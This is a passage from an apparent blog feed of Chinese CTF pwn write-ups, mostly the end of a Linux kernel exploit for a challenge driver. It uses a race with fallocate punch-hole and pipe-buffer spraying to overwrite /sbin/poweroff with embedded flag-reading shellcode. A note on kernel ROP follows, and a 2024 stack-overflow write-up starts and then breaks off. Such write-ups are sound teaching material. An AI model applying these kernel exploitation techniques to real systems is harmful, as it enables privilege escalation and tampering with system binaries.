class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> shm_id;</span><br><span class="line"><span class="comment">// SYNC</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sync_s</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x3;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x4;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sync_s</span> *<span class="title">sync_s</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MMAP_ADDR ((void *)0xdead0000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TARGET_PAGES (TARGET_SIZE / 0x8 - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// PUNCHING HOLE</span></span><br><span class="line"><span class="type">int</span> mfd;</span><br><span class="line"><span class="type">size_t</span> shmem_sz = (<span class="number">0x1000</span> * <span class="number">0xa</span>) * PAGE_SIZE;</span><br><span class="line"><span class="type">int</span> <span class="title function_">punch_hole_prepare</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    mfd = memfd_create(<span class="string">&quot;x&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mfd == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;memfd_create failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *addr = mmap(MMAP_ADDR, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, mfd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr != MMAP_ADDR) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret = fallocate(mfd, <span class="number">0</span>, <span class="number">0</span>, shmem_sz);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fallocate failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;fallocate success&quot;</span>);</span><br><span class="line">    <span class="type">void</span> *addr2 = mmap(MMAP_ADDR + PAGE_SIZE, PAGE_SIZE * TARGET_PAGES, PROT_READ | PROT_WRITE,</span><br><span class="line">                       MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr2 != MMAP_ADDR + PAGE_SIZE) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;mmap failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger_punch_hole</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">while</span> (!sync_s-&gt;x1)</span><br><span class="line">        ;</span><br><span class="line">    info(<span class="string">&quot;trigger_punch_hole&quot;</span>);</span><br><span class="line">    sync_s-&gt;x2 = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> ret = fallocate(mfd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE, <span class="number">0</span>, shmem_sz);</span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;fallocate&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_fd</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!sync_s-&gt;x3)</span><br><span class="line">        ;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] trigger uaf\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    spray_pipes(<span class="number">0x10</span>, MAX_PIPE_COUNT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0x10</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> k = i;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;writesth&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    del();</span><br><span class="line"></span><br><span class="line">    spray_pipes(<span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> k = i;</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;writesth&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;Qanux&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">triger_vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    sync_s-&gt;x1 = <span class="number">1</span>;</span><br><span class="line">    add();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!(sync_s-&gt;x2))</span><br><span class="line">        ;</span><br><span class="line">    info(<span class="string">&quot;triger_vuln&quot;</span>);</span><br><span class="line">    sync_s-&gt;x3 = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(write(fd, MMAP_ADDR, <span class="number">0x1</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    info(<span class="string">&quot;triger_done&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x97</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0x2f</span>, <span class="number">0x66</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xf6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc0</span>, <span class="number">0x02</span>,</span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xbf</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> t1, t2, t3;</span><br><span class="line">    shm_id = shmget(IPC_PRIVATE, <span class="number">0x1000</span>, IPC_CREAT | <span class="number">0666</span>);</span><br><span class="line">    <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;shmget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sync_s = (<span class="keyword">struct</span> sync_s *)shmat(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    punch_hole_prepare();</span><br><span class="line">    pthread_create(&amp;t1, <span class="number">0</span>, triger_vuln, <span class="number">0</span>);</span><br><span class="line">    pthread_create(&amp;t2, <span class="number">0</span>, trigger_punch_hole, <span class="number">0</span>);</span><br><span class="line">    pthread_create(&amp;t3, <span class="number">0</span>, delete_fd, <span class="number">0</span>);</span><br><span class="line">    pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t2, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t3, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try to find corrupted pipe_buf</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] finding corrupted page\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> corrupted_index = <span class="number">-1</span>, pointed_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MAX_PIPE_COUNT; ++i) &#123;</span><br><span class="line">        already_read[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">uint32_t</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> p_buf[<span class="number">0x10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">memset</span>(p_buf, <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], p_buf, <span class="number">8</span>);</span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;k, <span class="keyword">sizeof</span>(<span class="type">uint32_t</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (k != i) &#123;</span><br><span class="line">            corrupted_index = i;</span><br><span class="line">            pointed_index = k;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] found %d=&gt;%d pipe data: %p\n&quot;</span>, i, k, *(<span class="type">uint64_t</span> *)p_buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (corrupted_index == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to find corrupted page\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *alloc_buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(alloc_buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], alloc_buf, <span class="number">0x20</span>);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[corrupted_index][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> passwd_fd[<span class="number">0x200</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        passwd_fd[i] = open(<span class="string">&quot;/sbin/poweroff&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(passwd_fd[i] &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;open target file.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> tmp = <span class="number">0x480e801f</span>;</span><br><span class="line">    write(pipe_fd[pointed_index][<span class="number">1</span>], &amp;tmp, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        <span class="type">int</span> retval = write(passwd_fd[i], shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">        <span class="keyword">if</span>(retval &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;write file success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)&#123;</span><br><span class="line">        close(passwd_fd[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ±‚è§£æ•ˆæœ-3"><a href="#æ±‚è§£æ•ˆæœ-3" class="headerlink" title="æ±‚è§£æ•ˆæœ"></a>æ±‚è§£æ•ˆæœ</h3><img src="/2024/10/07/kno_puts/13.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™é‡Œæƒ³åˆ†äº«ä¸€ä¸‹æˆ‘åšé¢˜æ—¶çš„å¿ƒç†å˜åŒ–ã€‚å½“æ—¶æˆ‘çœ‹è§ <code>uaf</code> ç›´æ¥æƒ³ç€ç”¨ <code>USMA</code> ç»™ä»–ç§’äº†ï¼Œæ‰€ä»¥è°ƒè¯•éƒ½æ‡’çš„è°ƒç›´æ¥ä¸€å£æ°”æŠŠæ•´ä¸ª <code>exp</code> ç»™å†™å®Œï¼Œç»“æœä¸€è¿è¡Œå‘ç°å†…æ ¸ç¼–è¯‘æ—¶å…³é—­äº†æŸäº›é€‰é¡¹ï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´æ— æ³•ä½¿ç”¨ <code>USMA</code>ï¼Œäºæ˜¯æˆ‘å°±ç”¨æ­£å¸¸ç‚¹æ‰“æ‰“æ³•å»åŠ«æŒ <code>tty_struct</code> ç„¶åä½¿ç”¨ <code>work_for_cpu_fn</code> ä¸€æŠŠæ¢­ï¼Œç»“æœå†…æ ¸ç›´æ¥å¡åœ¨ <code>work_for_cpu_fn</code> é‡Œé¢äº†ï¼Œæƒ³äº†åŠå¤©æ²¡æƒ³æ˜ç™½ï¼Œæœ€åå‘ç°æˆ‘çš„ <code>vmlinux</code> æ˜¯æ¥è‡ªåˆ«çš„é¢˜ç›®çš„ğŸ˜‡ğŸ¤£ï¼Œå½“åœºè£‚å¼€ã€‚æŠŠæ‰€æœ‰åœ°å€æ›¿æ¢æ­£ç¡®ä¹ŸèŠ±äº†ç‚¹æ—¶é—´ï¼Œå¯æ˜¯ç¨‹åºè¿˜æ˜¯å¡åœ¨ <code>work_for_cpu_fn</code> é‡Œé¢ï¼Œæˆ‘è§‰å¾—æ˜¯æˆ‘æŠŠ <code>fake ops</code> å†™åˆ°äº† <code>tty_struct</code> å ç”¨äº†æŸäº›å˜é‡çš„ä½ç½®é€ æˆçš„ï¼Œäºæ˜¯æˆ‘å°±ç”¨ <code>ret2hbp</code> æƒ³æŠŠ <code>fake ops</code> å†™åˆ° <code>db_stack</code> ä¸Šï¼Œç»“æœæ„Ÿè§‰åˆæ˜¯ç¼–è¯‘æ—¶å…³é—­äº†æŸäº›é€‰é¡¹ï¼Ÿå†™åŠå¤©å†™ä¸ä¸Šå»ï¼Œç›´æ¥å¿ƒæ€å´©äº†ã€‚åé¢æœ‰äººæé†’æˆ‘çœ‹çœ‹èƒ½ä¸èƒ½ç”¨ <code>pt_regs</code>ï¼Œæˆ‘çœ‹äº†çœ¼åç§»æ˜¯å›ºå®šäº†ï¼Œäºæ˜¯é©¬ä¸Šåœ¨ <code>pt_regs</code> ä¸Šå†™å¥½ kenrel rop ç›´æ¥æ ˆè¿ç§»è¿‡å»ï¼Œä¸­é—´ä¸ºäº†æ‰¾ <code>init_cred</code> çš„åœ°å€åˆä¸å¾—ä¸æŠŠ <code>vmlinux</code> ä¸¢è¿› <code>ida</code> é‡Œé¢æ…¢æ…¢æ‰¾ï¼Œæœ€åæˆåŠŸæŠŠè¡€ç»™ææ²¡äº†ğŸ¤£</p><p>æ„Ÿè§‰è‡ªå·±çš„æ°´å¹³è¿˜æ˜¯å¤ªä½äº†ï¼Œæˆ‘è¿˜èƒ½å˜å¾—æ›´å¼ºæŠŠ :-(</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¾ŠåŸæ¯ 2024 pwn writeup</title>
      <link href="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/"/>
      <url>/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/</url>
      
        <content type="html"><![CDATA[<p>å»å¹´å°±çŸ¥é“è¿™ä¸ªæ¯”èµ›å¾ˆå·ï¼Œæ²¡æƒ³åˆ°ä»Šå¹´æ›´å·ã€‚æŸæŸæˆ˜é˜Ÿè·ç¦»æ¯”èµ›ç»“æŸè¿˜æœ‰40åˆ†é’Ÿæ—¶æ’åç¬¬ä¸€ï¼Œæ¯”èµ›ç»“æŸæ—¶æ’ç¬¬äºŒåä¸€ï¼ŒçœŸçš„é€†å¤©ã€‚<br>è¿™æ¬¡æ¯”èµ›å­¦é•¿ä¸æ˜¯åœ¨å®ä¹ å°±æ˜¯å»å¸®åˆ«çš„æˆ˜é˜Ÿæ‰“ï¼Œåˆ°å¤´æ¥pwnå…¨éƒ½åªèƒ½æˆ‘ä¸€ä¸ªäººæ¥æ‰“ï¼ŒçœŸçš„å¥½ç´¯å–µğŸ˜‡ã€‚è¿˜å¥½é¢˜ç›®ä¸æ˜¯å¾ˆéš¾ï¼Œä¸€å…±äº”é¢˜pwnï¼Œå‰4é¢˜å¾ˆå¿«å°±æ‰“å®Œäº†ï¼Œæœ€åä¸€é¢˜å·¨æŠ½è±¡ï¼Œæœ¬åœ°ä¸åŒçš„æ‰“æ³•éƒ½é€šäº†ï¼Œè¿œç¨‹æ­»æ´»ä¸åŒï¼ŒçœŸæ˜¯è®©äººé“å¿ƒç ´ç¢æã€‚</p><h3 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h3><p>è¿™æ˜¯æœ¬æ¬¡æ¯”èµ›çš„ç­¾åˆ°é¢˜ï¼Œä¸»é€»è¾‘å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s start the construction for stack overflow exploit.&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can you grasp this little bit of overflow?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå­˜åœ¨<code>0x10</code>å­—èŠ‚çš„æº¢å‡ºã€‚ç”±äºåªèƒ½è¦†ç›–<code>rbp</code>å’Œ<code>ret</code>ï¼Œæ‰€ä»¥éœ€è¦æ ˆè¿ç§»ï¼Œç„¶å<code>ret2libc</code>ï¼Œè¿™é‡Œæˆ‘æ ˆè¿ç§»äº†2æ¬¡ï¼Œç¬¬ä¸€æ¬¡ç”¨æ¥æ³„éœ²åœ°å€ï¼Œç¬¬äºŒæ¬¡ç”¨æ¥getshellã€‚å¯æ˜¯ä¸çŸ¥é“æ˜¯ä¸æ˜¯ç¯å¢ƒçš„é—®é¢˜ï¼Œæˆ‘æœ¬åœ°æ‰“<code>system(&quot;/bin/sh&quot;)</code>æ­»æ´»éƒ½ä¸é€šï¼Œæ‰“<code>execve(&quot;/bin/sh&quot;,0,0)</code>å‘ç°æ ˆè¿ç§»åæº¢å‡ºçš„å­—èŠ‚ä¸å¤Ÿæˆ‘å†™ropé“¾ï¼Œæœ€ååªèƒ½ä½¿ç”¨libcä¸Šçš„gadgetæ¥ä½¿å…¶æ»¡è¶³å…¶ä¸­ä¸€ä¸ª<code>one_gadget</code>æ¥getshellğŸ˜‡<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 